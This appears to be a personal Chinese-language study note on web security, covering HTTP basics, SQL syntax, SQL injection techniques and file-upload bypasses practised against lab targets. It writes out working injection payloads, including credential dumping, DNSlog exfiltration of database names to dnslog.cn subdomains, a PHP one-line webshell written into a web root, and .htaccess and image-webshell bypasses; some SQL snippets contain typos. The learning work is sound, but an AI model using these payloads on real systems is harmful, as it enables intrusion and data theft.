---
title: SQL注入与文件上传
date: 2026-06-13 00:00:00
categories:
  - Web安全
tags:
  - SQL注入
  - 文件上传
---
# Web安全

## http协议

### http/https简介

HTTP 的 URL 是由 **http://** 起始与默认使用端口 **==80==**，而 HTTPS 的 URL 则是由 **https://** 起始与默认使用端口**==443==**。

HTTP 本身是**不安全**的，因为传输的数据==**未经加密**==，可能会被窃听或篡改，为了解决这个问题，引入了 HTTPS，即在 HTTP 上加入 ==**SSL/TLS 协议**==，为数据传输提供了==**加密和身份验证**==。

HTTPS **经由 HTTP** 进行**通信**，但**利用 SSL/TLS 来加密数据包**



https的的**==单项认证==**（**服务器认证**）

1. 客户端发起 HTTPS 请求，服务器返回**自己的 SSL/TLS 证书**（由权威 CA 机构签发，包含服务器公钥、域名、有效期等信息）。

2. 客户端验证证书的合法性：

   - 检查证书是否过期、域名是否匹配；
   - 检查证书是否由受信任的 CA 机构签发（操作系统 / 浏览器内置了可信 CA 列表）。

3. 验证通过后，客户端用服务器公钥加密一个 “**对称加密密钥**”，发给服务器；

4. 服务器用自己的==**私钥**==解密，得到对称密钥，后续双方就用这个**对称密钥**==**加密传输数据**==。

   

   **==双向认证==**比较少，一般在对安全要求比较严格的场景下使用

### 请求头

#### 传参

##### Get请求方式传参

**GET 请求的参数是直接拼接在 URL 后面的**

GET 请求的**==参数格式==**是 `URL?参数名=参数值`

如http://node5.buuoj.cn:28738/?ctf=123



##### POST方式传参

POST方式传参，**参数**是是放到==**请求体**==里面的



#### 基础认证（basic认证）

Basic认证是一种较为**简单**的HTTP认证方式，客户端通过==**明文（Base64编码格式）**==传输**用户名**和**密码**到服务端进行认证，通常需要配合HTTPS来保证信息传输的安全。

当request第一次到达服务器时，服务器没有认证的信息，服务器会返回一个401 Unauthozied给客户端。认证之后将认证信息放在session，以后在session有效期内就不用再认证了。

用户名和密码存放在**==请求头==**的 **Authorization: Basic**中 格式位**用户名:密码（base64编码）**



#### User-Agent

`User-Agent`（用户代理）是 HTTP 请求头的一个字段，里面存放的是**发起请求的客户端（比如浏览器、爬虫、APP）的身份信息**，用来告诉服务器 “我是什么设备 / 软件”。



#### Cookie

Cookie 里存放的是**==服务器发给客户端==、==由客户端（浏览器）保存==的小型文本数据**，主要用于记录用户的状态信息，实现会话保持、个性化设置等功能。



#### Session

Session不是http报文的字段

Session**==存储在服务器==**上

Session和Cookie配合工作

1. 服务器创建 Session，生成唯一 Session ID。
2. 服务器通过 `Set-Cookie` 将 Session ID 发送给客户端。
3. 客户端后续请求自动携带包含 Session ID 的 Cookie。
4. 服务器根据 Session ID 找到对应的 Session 数据。

> 注意：Session 依赖 Cookie 来传递 Session ID（虽然也可通过 URL 重写，但不常用）。



#### Referer

**Referer 请求头用来告诉服务器，当前请求是==从哪个页面==跳转过来的**。

比如你从 `a.com` 点击链接进入 `b.com`，那么访问 `b.com` 的请求头里就会带 `Referer: https://a.com`



referer的正确英语拼法是**referrer**。由于早期HTTP规范的拼写错误，为了保持向后兼容就将错就错了。

#### X-Forwarded-For和X-Real-IP

这两个请求头是用来**标识客户端的真实 IP 地址**

![image-20251217104507652](D:\TyporaNote\Web安全\image-20251217104507652.png)

对于这种提示**==只能本地读取==**的，我们使用**X-Forwarded-For:127.0.0.1**请求头即可

X-Forwarded-For 不仅可以记录**客户端真实IP**还可以记录**经过的代理IP**

`X-Forwarded-For: 客户端真实IP, 代理1IP, 代理2IP...`

X-Real-IP **只记录客户端真实IP**

`X-Real-IP: 真实IP`

部分服务器会**优先识别`X-Real-IP`**，若 **XFF 不生效**可以**==换X-Real-IP==**试试



### 回环地址

127.0.0.1 是**IPv4 中的本地回环地址**，专门用于==**本机自身**==的网络测试和进程间通信



### hosts 文件

**hosts 文件相当于本地的 “迷你 DNS 服务器”**，而且优先级比网络上的公共 DNS 更高



## MySql

MySQL 是**开源的关系型==数据库管理系统==**，核心是用表存储数据、用 SQL 操作数据



## phpmyadmin

**phpMyAdmin 是一款基于 PHP 开发的、用于管理 MySQL/MariaDB 数据库的免费开源网页工具**。

可以把 phpMyAdmin 看作是 MySQL 的 **“可视化操作界面”**



## PHP

**PHP**（全称：PHP: Hypertext Preprocessor，即 “超文本预处理器”）是一种专门为 Web 开发设计的**服务器端脚本语言**。

PHP 代码不是在用户的浏览器里执行，而是在**网站的服务器**上执行，执行完后只把生成的**普通 HTML** 内容发送给用户，用户看不到你的 PHP 源代码。



## SQL注入

一、### 数据库
#### ==information_schema==
information_schema包含**所有mysql数据库的简要信息**

其中有两个**重要的数据表**
1.##### **==tables==**
2.##### **==columns==**

tables表里有所有数据库的**==表名==**
**table_schema**这一列存放的是数据库的名字
**table_name**这一列是数据表的名字
columns里有所有数据表的**==列名==**

### 数据类型
**char**   ==**固定长度**==，不足补空格
**varchar**   ==**可变长度**==，只存实际字符 + 长度标识


### sql注入步骤（万能语句' OR '1'='1' 为恒真）

1.查找**注入点**
2.判断是**字符型注入**还是**数字型注入**  and 1=1 1=2 或 3-1
3.若为字符型注入，判断**闭合方式**。   ' ,  "" , ') ,")这几种
4.判断查询**列数**  group by  order by
5.查询**回显位置**


### sql命令
##### 数据库的==增删改查==

**==查看==数据库**	
`show databases;`

**==创建==数据库，并选择==字符集==**	
`create database employees charset utf8;`

==**删除**==数据库	
`drop database employees;`

==**进入**==数据库
`use employees`

**创建数据表**
`create table employee`

写入表格==**信息及参数**==
```sql
(
id int,
name varchar(40),
sex char(4),
birthday date,
job varchar(100)
);
```

查看**==数据表信息==**
`show full columns from employee;`

查看数据表==**列表**==
`select * from employee;`

**==删除==**数据表
`drop table employee`

**修改数据表名**称为user
`rename table employee to user;`

修改**字符集**
`alter table user character set utf8;`

插入一行数据
~~~sql
insert into user
(
		id,name,sex,birthday,job)
values
(
		1,'ctfstu','male’,'1999-05-06','it)
;
~~~

表中**==增加一列==**
~~~sql
ALTER TABLE user ADD salary decimal(8,2)；
~~~
decimal是**==定点数类型==**（用于存储精确的小数）
- decimal(M,D)	是固定格式：
  - `M`（总位数）：表示数字的**总长度（整数部分 + 小数部分）**，这里`8`代表整个数字最多占 8 位；
  - `D`（小数位数）：表示**小数部分的位数**，这里`2`代表保留 2 位小数。
  表中**修改一列**
~~~sql
UPDATE user set name='hankai' WHERE id=1;
~~~

**where** 是**==限定语句==**



**==删除列==**
~~~sql
alart table user drop salary;
~~~


**==删除行==**
~~~sql
delete from user where id=1;
~~~


**删除表**
~~~sql
delete from user;
~~~



#### 基本查询语句
##### Select 

~~~sql
select * from user where id=1;
select * from user where id in ('4');   这种效果也一样
~~~
**select** 后跟表中的**==列名==**
**from**	后面跟**==表名==**

**子查询**  先查询**括号内的查询语句**
~~~sql
SELECT * FROM users WHERE id = (SELECT id FROM users WHERE username='admin');
~~~



###### 查询参数 union(联合查询)
~~~sql
SELECT id FROM users UNION SELECT email_id FROM emails;
~~~
查询并合并数据显示



**但是**这种要求前后两个数据**==列数相同==**
~~~sql
SELECT * FROM users WHERE id=1 UNION SELECT * FROM emails WHERE id=1;
~~~
这种会报错，因为mails表里只有**2列数据**，而users表里有**3列数据**

~~~sql
SELECT * FROM users WHERE id=1 UNION SELECT *,3 FROM emails WHERE id=1;
~~~
**解决方法**就是在后面**填一个3**



效果如图

###### group by
`GROUP BY` 就是把数据库表里的**相同特征的数据 “打包” 成一组**，比如把所有 “男性” 数据放一组、所有 “女性” 数据放一组，把所有 “销售部” 数据放一组、所有 “技术部” 数据放一组。

| 姓名 | 部门   |
| ---- | ------ |
| 张三 | 销售部 |
| 李四 | 技术部 |
| 王五 | 销售部 |
| 赵六 | 技术部 |
如果执行
~~~sql
SELECT 部门 FROM 员工表 GROUP BY 部门;
~~~

则会显示
| 部门   |
| :----- |
| 销售部 |
| 技术部 |

**==判断数据有多少列==**
~~~sql
SELECT * FROM users  GROUP BY 5;
~~~

可以用这种方法判断**==数据有多少列==**（group by N   **N的意思就是按第几组数据进行分组**，超过了列数显然就不行了）


一个例子：
~~~sql
SELECT gender, COUNT(id) AS 人数
FROM users
GROUP BY gender;
~~~

原来的表
| id   | username | gender | salary |
| ---- | -------- | ------ | ------ |
| 1    | 张三     | 男     | 5000   |
| 2    | 李四     | 男     | 6000   |
| 3    | 王五     | 女     | 5500   |
| 4    | 赵六     | 女     | 7000   |

执行后

| gender | 人数 |
| ------ | ---- |
| 男     | 2    |
| 女     | 2    |



###### order by

~~~sql
SELECT * FROM users ORDER BY 1;
~~~
按第一列的数据**==升序排列==**

~~~sql
SELECT * FROM users ORDER BY 1 desc;
~~~
按第一列的数据**==降序排列==**



###### limit a,b
~~~sql
SELECT * FROM users LIMIT 1,3;
~~~

限制**==输出的行数==**，从**第0行开始**
a表示从**第几行开始**
b表示**输出的行数**



###### And和or

~~~sql
SELECT * FROM users WHERE id=6 OR username='admin3';
~~~

~~~sql
SELECT * FROM users WHERE id=6 AND username='admin3';
~~~

这两个好理解



###### group_concat

~~~sql
SELECT GROUP_CONCAT(id,username,password) FROM users ;
~~~

将东西放**==到一行输出==**



###### concat()

~~~sql
concat(1,2)
~~~

把两个东西**==拼接起来==**

输出结果是12



##### 查看当前==**数据库名称**==

~~~sql
SELECT DATABASE();
~~~



查看当前==**数据库版本**==

~~~sql
SELECT version();
~~~



###### 注释

**--**后面的内容在绝大多数数据库会被**==当成注释==**(不会执行)

**+**通常可以**==代表空格==**

标准的 `--` 后面需要跟**至少一个空格**（比如 `-- abc`），否则数据库可能不识别。

--+的意思就是后面的内容为**注释**



   ==#== 和**==23%==** 也可以起到**注释作用**



### 注入分类

按**查询字段**

**==字符型==**	输入参数为**字符串**

==**数字型**==	输入参数为**整形**

**==若是数字型，那么就不用判断闭合方式==**

按**注入方法**

Union注入，报错注入，布尔注入，时间注入



**判断是**字符型注入还是数字型注入

使用**and 1=1 和 and 1=2**来判断



~~~http
http://192.168.78.128/sql/Less-1?id=1 and 1=1
http://192.168.78.128/sql/Less-1?id=1 and 1=2
~~~

如果这两种都能正常访问，则说明是**==字符型注入==**

反之则为**==数字型注入==**



#### 闭合方式

|      |      |      |      |      |
| :--: | ---- | ---- | ---- | ---- |
|  '   | "    | ')   | ")   | 其他 |

如何**判断闭合方式**

输入**？id=2'**

报错为
**'  '2'  '  LIMIT  0,1' atl line 1**

说明闭合方式为      **'**     **==单引号==**



**闭合的作用**

**==手工提交==**闭合符号，**==结束前一段查询语句==**后面即可**==加入其他语句==**查询需要的参数

**不需要的语句**可以用注释符号**'--+’**或**'#’**或’**%23’**注释掉



#### Union注入

```sql
http://192.168.14.129/sql/Less-1/?id=-1' union select 1,version(),database()--+
```

**==id=-1==**时，**第一行内容不存在**，这样就可以**显示第二行内容**



查询**当前数据库**的**==所有表名==**

~~~sql
http://192.168.14.129/sql/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() --+
~~~



查询当前**数据表**的**==所有列名==**

```sql
http://192.168.14.129/sql/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users' --+
```



然后就可以查看所有**用户名和密码了**

~~~sql
http://192.168.14.129/sql/Less-1/?id=-1' union select 1,2,group_concat(username,'~',password) from users --+
~~~

'~'是添加的**分隔符**，方便看



#### 报错注入

![image-20260128102729127](D:\TyporaNote\Web安全\image-20260128102729127.png)

#### extractValue报错注入

##### extractValue()函数

函数extractValue()包含**两个参数**

第一个参数是**==xml文档的对象名称==**，第二个是**==路径==**

~~~sql
select extractvalue(doc,'/book/author/surname')from xml
~~~



如果把第一个   **/**   写成   **~**   那么就会报错

~~~sql
select extractvalue(doc,'~book/author/surname')from xml
~~~



##### 例子

~~~sql
select extractvalue(doc,concat(0x7e,(select database())))from xml
~~~

**0x7e**就是   **~**   

这样就可以利用报错显示**==库名==**

实际第一个**参数doc**可以随便写，都可以实现报错的目的



~~~sql
?id=100' union select 1,extractvalue(1,concat(0x7e, (select database())))--+
~~~

~~~sql
?id=100' and 1=extractvalue(1,concat(0x7e,(select database())--+
~~~

这两种方法都可以



但是报错注入只能**==返回32个字符==**

因此需要使用**substring()函数**



##### substring()函数

控制字符串的显示

第一个参数是**字符串**，第二个参数是从**第几个字符显示**，第三个参数是**显示几个字符**

~~~sql
substring(1234567,1,3)
~~~

这个结果就是**123**



~~~sql
http://192.168.14.129/sql/Less-5/?id=2' union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password) from users),1,30)))--+
~~~

修改第二个参数1，就可以看到所有内容



#### updataxml报错注入

和extractvalue的原理基本相同

~~~sql
updataxml(doc,'/book','1')
~~~

第一个参数是**==xml文档的对象名称==**，第二个参数是**==路径==**，第三个参数是**==新的数据==**



#### floor报错

##### rand()函数   

随机显示0-1之间的**小数**



~~~sql
select rand() from users;
~~~

这是users这张表里有**几行**，rand函数就执行**几次**

| rand()              |
| ------------------- |
| 0.4336564638034035  |
| 0.3362578994932192  |
| 0.38032013678953064 |
| ...                 |

大概就是这种效果



~~~sql
select floor(rand(0),*2) from users;
~~~

如果是这种，那么它就算的结果是**==固定的==**，按照**==一定顺序==**排列



##### floor()函数   

**向下取整**    例如floor(rand())的结果就是0



##### seiling()函数  

**向上取整**



##### concat_ws()函数  

将括号内的数据用**第一个字段连接**起来

~~~sql
concat('-',database(),floor(rand()));
~~~

结果就是sceurity-0



##### as

起别名

##### count()函数

统计数量



#### 例子

~~~sql
select count(*),concat_ws('-',(database()),floor(rand()*2)) as a from users group by a;
~~~

这种**偶尔**会出现**报错**，但会把**==database()的结果==**显示出来

用**==rand(0)*2==**一定会报错



~~~sql
http://192.168.14.129/sql/Less-5/?id=-1' union select 1,count(*),concat_ws('-',(select version()),floor(rand(0)*2) ) as a from information_schema.tables group by a --+
~~~

用floor报错查询**数据库版本**



~~~sql
http://192.168.14.129/sql/Less-5/?id=-1' union select 1,count(*),concat_ws('-',(select concat('~',username,':',password) from users limit 0,1),floor(rand(0)*2) ) as a from information_schema.tables group by a --+
~~~

group_concat 函数不能用，可以尝试**concat_ws**，配合**limit**



#### 盲注

页面**没有报错**，也**没有回显**，不知道数据库具体返回值的情况下，对数据库的内容进行**猜解**，实行sql注入。



##### 盲注分类

布尔盲注，时间盲注，报错盲注



##### 布尔盲注

web页面只返回**ture真**，**false假**两种类型。利用页面返回不同，逐个猜解数据。



###### ascii()

显示字母的ascii码

~~~sql
select ascii('e');
~~~

结果就是101



###### substr()

和substr类似

~~~sql
substr('abcd',1,1);
~~~

结果是**a**



###### 例子

~~~sql
http://192.168.14.129/sql/Less-8/?id=2' and ascii(substr((select database()),1,1)) >= 110 --+
~~~

可以用这种方法来判断**数据库的名称**



~~~sql
select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) 1,1)>=100--+
~~~

用这种方法查**表名**



##### 时间盲注

web页面**只返回一个正常页面**。利用页面**==响应时间==**不同，逐个拆解数据。



**sleep()函数**

休眠多少秒



**if()函数**

~~~sql
select if(1=1,sleep(0),sleep(3));
~~~

1=1为真，执行**sleep(0)**。



例子

~~~sql
http://192.168.14.129/sql/Less-9/?id=1' and if((ascii(substr((select database()),1,1))>115),sleep(0),sleep(3))--+
~~~

把if语句**第一个参数**换成要查询的命令即可



#### sql注入 文件上传

~~~sql
SHOW VARIABLES LIKE '%secure%';
~~~

用来查看mysql是否有**读写文件的权限**

看**secure_file_priv**的值为空说明有**所有文件**的读写权限



##### 一句话木马

~~~php
<?php @eval($_POST[password]);?>
~~~



##### 例子

~~~sql
http://192.168.14.129/sql/Less-7/?id=-2')) union select 1,2,"<?php @eval($_POST['haha']);?>" into outfile "C://phpstudy_pro//WWW//haha.php" --+
~~~

把**一句话木马**写入网站的目录



![image-20260131174018110](D:\TyporaNote\Web安全\image-20260131174018110.png)

再用**蚁剑连接**



#### DNSlog手动注入

##### load_file()

~~~sql
select load_file("C:\\benben.txt")
~~~



##### UNC

**UNC路径**（Universal Naming Convention，通用命名约定）是 Windows 系统中用于访问网络共享资源的标准化格式。

格式:    `\\计算机名\共享名\路径\文件`

计算机名可以是**域名**和**IP地址**



##### 用到的网站

~~~http
http://www.ceye.io
http://www.dnslog.cn
~~~



##### 例子

~~~sql
http://192.168.14.129/sql/Less-9/?id=1' and (select load_file(concat("//",(select database()),".qxdv6w.dnslog.cn/benben.txt"))) --+
~~~

查看数据库名

~~~sql
http://192.168.14.129/sql/Less-9/?id=1' and (select load_file(concat("//",(select table_name from information_schema.tables where table_schema=database() limit 0,1),".eppjca.dnslog.cn/benben.txt"))) --+
~~~

查看表名

(select load_file(concat("//",(select database()),".eppjca.dnslog.cn/benben.txt"))) --+



#### POST union注入

##### post提交和get提交

1. get提交可以被**缓存**，post提交不会
2. get提交参数会保存在浏览器的**历史记录**里，post提交不会
3. get提交可以被**收藏为书签**，post提交不会
4. get提交有**==长度限制==**，最长有**2048个字符**。post提交没有要求，不是只允许使用ASCII字符，还可以使用二进制数据。



**post提交**比get提交**==安全==**



##### 万能密钥

admin' **==or 1=1 #==**

![image-20260209160242580](D:\TyporaNote\Web安全\image-20260209160242580.png)

username存在**注入点**，用**or**指令绕过密码验证



##### 例子

~~~sql
uname=' union select 1,(database()) #&passwd=admin&submit=Submit
~~~

![image-20260209160655512](D:\TyporaNote\Web安全\image-20260209160655512.png)

把注入写入**请求体**里，其他不变



#### POST 报错注入

~~~sql
passwd=admin') union select count(*),concat_ws('-',(select database()),floor(rand(0)*2)) as a from information_schema.tables  group by a #&submit=Submit&uname=admin
~~~

把内容写入请求体的**floor报错**



~~~sql
passwd=admin') union select count(*),concat_ws('-',(select concat(username,':',password) from users  limit 1,1),floor(rand(0)*2)) as a from information_schema.tables  group by a#&submit=Submit&uname=admin
~~~

查看**用户名和密码**



#### POST布尔注入

~~~sql
passwd=admin&submit=Submit&uname=adm' or ascii(substring((select database()),1,1))>=115#
~~~



#### POST时间盲注

~~~sql
passwd=admin&submit=Submit&uname=adm' or if((ascii(substring((select database()),1,1))>=115),sleep(0),sleep(2))#
~~~



#### POST DNSlog注入

~~~sql
passwd=admin&submit=Submit&uname=adm' and (load_file(concat("//",(select database()),)))#
~~~



#### HTTP头uagent注入

User-Agent（UA）

- **作用**：标识客户端浏览器、操作系统
- **注入点**：如果后端把 UA 写入数据库，且没有过滤

代码审计发现对uagent有写入数据表操作，且没有**检查**，考虑uagent注入。

~~~php
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
~~~

然后uagent注入就行了

~~~
User-Agent: ' or updatexml(1,concat('~',(select database())),3),2,3) #
~~~



![](D:\TyporaNote\Web安全\image-20260224104531410.png)



#### HTTP头referer



~~~
Referer: ' or extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))),2)#
~~~

![image-20260224145644882](D:\TyporaNote\Web安全\image-20260224145644882.png)



#### HTTP头cookie

和上面两个同理

~~~
Cookie: uname=' union select 1,2,(select group_concat(username,':',password) from users ) #
~~~

![image-20260224153059547](D:\TyporaNote\Web安全\image-20260224153059547.png)



#### 过滤注释符绕过

由这张图可以推出原始的sql语句是SELECT * FROM users WHERE id='1' LIMIT 0,1

所以正常情况下是输入1，而我输入了1',使其语句变成SELECT * FROM users WHERE id='1'' LIMIT 0,1使得报错

![image-20260524151837155](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260524151837155.png)

这个靶场里面过滤--和#，使其无法用注释符，那就换种方法，先确认闭合方式为'。

图中可以判断出后端的sql语句为SELECT ... FROM ... WHERE id='$id' LIMIT 0,1

然后我们输入的1' order by 3#,因为注释符被过滤，然后我们输入的在后端的sql语句就变成

SELECT ... FROM ... WHERE id='1' order by 3' LIMIT 0,1 然后报错

![image-20260524152305935](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260524152305935.png)

已经确认了闭合方式为'，可以输入1' order by 3 or '1' and '1绕过

这时后端的sql语句为SELECT ... FROM ... WHERE id='1' order by 3 or '1' and '1' LIMIT 0,1这个，就不会报错

然后查看回显位用union联合注入获得数据，或者尝试其他注入方式获得数据

![image-20260524152908572](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260524152908572.png)

#### 被过滤的字符绕过方法

![image-20260524153040504](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260524153040504.png)

过滤了and和or，大小写绕过：anD，Or；双写绕过：anand,oorr；或者用&&代替and，用||代替or；



#### 空格和逗号过滤的绕过方式

**空格过滤绕过的方法：**

![image-20260524153550838](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260524153550838.png)

如果URL编码不可用，可以尝试报错注入，例如查库名extractvalue(1,concat('~',(database())))

查表名extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))

查列名extractvalue(1,concat('~',(select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='users'))))

获得列数据(报错注入输出有字节限制，最多输出32字节的数据)

extractvalue(1,concat('~',(select(substr(group_concat(username,password),1,32))from(users))))

extractvalue(1,concat('~',(select(substr(group_concat(username,password),32,32))from(users))))

**逗号过滤绕过方式：**



### 文件上传

#### 前端验证

**禁用JavaScript**，或**抓包修改**文件名即可



#### MIME绕过

MIME

`Content-Type` 是 HTTP 协议中的一个头字段，用于指示发送给接收方的数据的媒体类型（也称为**MIME类型**）

抓包修改MIME类型即可



`Content-Type` 是 **==字段名==**，MIME 类型是 **==字段值==**



#### httpd-config

作用：包含 Apache HTTP 服务器的全局行为和默认设置

作用范围：整个服务器

优先级：较低

生效方式：管理员权限，重启服务器后生效



#### .htaccess

作用：分布式配置文件，一般用于 URL 重写、认证、访问控制等

作用范围：特定目录（一般是网站根目录）及其子目录

优先级：较高，可覆盖 Apache 的主要配置文件(httpd-config)

生效方式：修改后立刻生效



htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的**==网页配置==**。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、**==改变文件扩展名==**、允许/阻止特定的用户或者目录的访问、禁止目录列表、**配置默认文档**等功能

简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以**php格式解析**。

文件名就是.htaccess

~~~
AddType application/x-httpd-php .png  //.png文件当作php文件解析
SetHandler application/x-httpd-php    //把当前目录所有文件都强制当PHP文件执行
~~~

这时再上传.png的文件就可以了



~~~
<FilesMatch "1">
　　SetHandler application/x-httpd-php
　　</FilesMatch>
~~~

可以在.htaccess 加入php解析规则

类似于把**文件名包含1的解析成php**

1.png 就会以**php执行**



#### php.ini

作用：存储了对整个 PHP 环境生效的配置选项。它通常位于 PHP 安装目录中

作用范围：所有运行在该 PHP 环境中的 PHP 请求

优先级：较低

生效方式：重启php或web服务器



#### . user.ini

作用: 特定于用户或特定目录的配置文件, 通常位于 Web 应用程序的根目录下。

它用于覆盖或追加全局配置文件（如 php.ini）中的 PHP 配置选项。

作用范围: 存放该文件的目录以及其子目录

优先级: 较高，可以覆盖 php.ini

生效方式: 立即生效

配置项                           作用                                                             利用方式

auto_prepend_file	  在 PHP 文件执行前自动包含一个文件	 包含图片马 / 日志文件
auto_append_file	   在 PHP 文件执行后自动包含一个文件	  同上
include_path	           修改包含路径	                                          配合其他技术使用

典型一句话利用（写进.user.ini）:

auto_pretend_file=shell.jpg（图片马）

效果：
同目录下任意 `.php` 文件执行前，都会自动包含 `shell.jpg` 中的 PHP 代码 → **获得 shell**



#### 大小写绕过

原理：

1. **服务器检查**：当文件上传时，服务器程序（如PHP）会检查它的后缀名（例如 `.php`）。如果代码没有统一转换为小写，它可能会认为 `.Php` 或 `.pHp` 是合法的，从而放行。
2. **操作系统解析**：文件最终存储在服务器上。如果服务器是 **Windows 系统**，它对文件名大小写不敏感，因此 `.Php` 文件会被当作 `.php` 文件正常解析和执行。



#### 点绕过

原理：

1. **后端代码的"刻板"匹配**：许多后端验证代码会简单地查找文件名中最后一个点(`.`)后的内容作为文件后缀。对于像`shell.php.`这样的文件名，它会认为后缀是`php.`（包含了一个点）。如果开发者将`.php`列入黑名单，`php.`恰好不在其中，因此后端会错误地放行。
2. **Windows的"自动纠错"机制**：文件最终需要存储在服务器的文件系统中。当在Windows系统上创建一个以点(`.`)结尾的文件（如`shell.php.`）时，系统会自动“修剪”掉末尾的点，将其保存为`shell.php`。这样，一个原本不具威胁的文件名最终被还原成了可执行的WebShell。
3. 若源代码没有使用deldot()过滤文件名末尾的点，可以使用文件名后加 .进行绕过，即1.php.

**空格绕过**和点绕过原理相似，Windows的文件系统保存时会自动把**==最后一个空格删掉==**



使用 `deldot()` 删除文件名末尾的点

> deldot() 函数从末尾向前检测，检测到第一个点后，会继续向前检测，但遇到空格会停下来
>
> 上传 shell.php，抓包修改后缀为 shell.php. .（点 + 空格 + 点），利用过程如下：
> 黑名单过滤阶段：
> 服务器先提取文件扩展名，strrchr() 会取最后一个 . 后的内容，也就是空字符（或空格），因此不会匹配到黑名单里的 .php，成功绕过检测。
> deldot() 处理阶段：
> 函数从末尾向前扫描，遇到最后一个 . 开始删除，往前遇到空格就停止，所以文件名会变成 shell.php. （末尾带空格）。
> Windows 系统自动处理：
> Windows 系统会自动忽略文件名末尾的点和空格，最终文件实际被保存为 shell.php，可以被解析执行



#### 空格绕过

`trim()` 是**字符串处理函数**，作用是：**去掉字符串** **开头和结尾的空白字符**（空格、换行、制表符等），**中间的空格保留不动**，由于 trim() 函数的作用是去除字符串两端的空格，若没有该tirm()函数，攻击者可在文件后缀名中插入空格。只要该文件名不在黑名单内，就能绕过检测并成功上传。

Windows 系统在处理文件名时，会自动忽略末尾的空格。







#### 补充

```php
<script language="php">@eval($_POST['pwd']);</script>
```

script虽然通常表示**JavaScript**,但通过**language="php"**，在**==php解释器里也能被执行==**。



#### ::$DATA 绕过（Windows NTFS）

源代码中缺少$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA，

php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名 他的目的就是不检查后缀名。



#### 文件头检查

**文件头**（File Header，也称文件签名或魔数）是文件开头的若干字节，用于标识文件的实际类型，而不是依赖文件扩展名。

**绕过方法**：攻击者可以在恶意文件开头插入合法的文件头（例如 `FF D8 FF`），让检测工具误认为是图片，同时后面拼接 PHP 代码。这种技巧称为**图片马**或**文件头伪造**。

gif的文件头为**GIF89a**

一些情况下使用jpg的**MIM**E，也可以用GIF的**文件头**，因为有**==可读的ASCII串==**，实现起来也比较方便



#### 字节标识绕过

![image-20260521200858884](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521200858884.png)

在恶意文件（如 PHP 木马）的开头，加上正常图片的魔术数字，让服务器误以为是图片。

在010中去修改，在前两个修改，图中修改头两个字节为png

![image-20260521202018615](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521202018615.png)



图片马加文件包含，先判断需要上传文件的类型，然后新建一个1.php，里面写入一句话木马，然后拖进010修改上传文件的前两个字节，进而让服务器误以为是图片实现绕过，但是蚁剑连接不上，不会以php的形式解析，而是根据改后的文件类进行解析。

![image-20260521203321009](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521203321009.png)

可以看出这个include通过是通过get的形式，用URL参数?file=接收一个文件名，然后用include语句去包含并执行这个文件。?file=这个地方写刚才上传图片马的位置，然后再用蚁剑测试是否可以连通。



#### getimagesize()

getimagesize()会检查图片**开头的魔数**和**图片的结构**（尺寸，类型），因此最好在一个**完整的图片**后插入php代码。

第一行 `GIF89a` 是合法的 GIF 文件头，`getimagesize()` 会识别为图片，直接通过上传校验。

第二行是你的 PHP 一句话木马，和图片头用换行分隔，无多余数据。

然后修改文件后缀（根据靶场要求），然后上传。

![image-20260521213816261](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521213816261.png)

发现能够上传，接着用文件包含漏洞让其内部php文件能够被执行

?file=这里写的是刚刚上传文件的路径

![image-20260521213935739](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260521213935739.png)





`PNG 文件头：89 50 4E 47 0D 0A 1A 0A`

`JPG 文件头：FF D8 FF E0`

仅仅插入**文件头不可行**

但是下面的exif_imagetype()就可以



#### exif_imagetype()

exif_imagetype() 是和 getimagesize() 类似的图片校验函数，不过它只读取文件开头的几个字节来判断文件类型，效率更高，也是上传场景里的常见拦截点。

exif_imagetype()通过读取**==文件头签名==**，来获取**==图片类型==**。



#### 二次渲染绕过





#### 00截断

**0x00 ， %00 ， /00** 之类的截断，都是一样的，只是不同表示而已。

在url中 %00 表示ascll码中的 0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为**==读取已结束==**。



~~~
https://xxx.com/upload/?filename=test.txt    此时输出是test.txt
~~~

~~~
https://xxx.com/upload/?filename=test.php%00.txt    此时输出的是test.php
~~~



~~~
 $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext; 
~~~

这总可以上传一个`1.jpg`文件再构造road为`upload/1.php%00;.txt`来使保存的文件为`1.php`



![image-20260604180813782](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20260604180813782.png)



#### 双写后缀

~~~php
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);
~~~

发现只是将文件后缀中的**php**替换成**空字符**，所以只需要上传一个`.pphphp`文件即可

因为中间的php被替换成**空字符**后后缀为`.php`



#### 文件后缀

如果服务器不能上传`.php `文件，可以尝试上传`.phtml`文件，`.phtml`文件在一些服务器也会**==当成`.php`文件执行==**

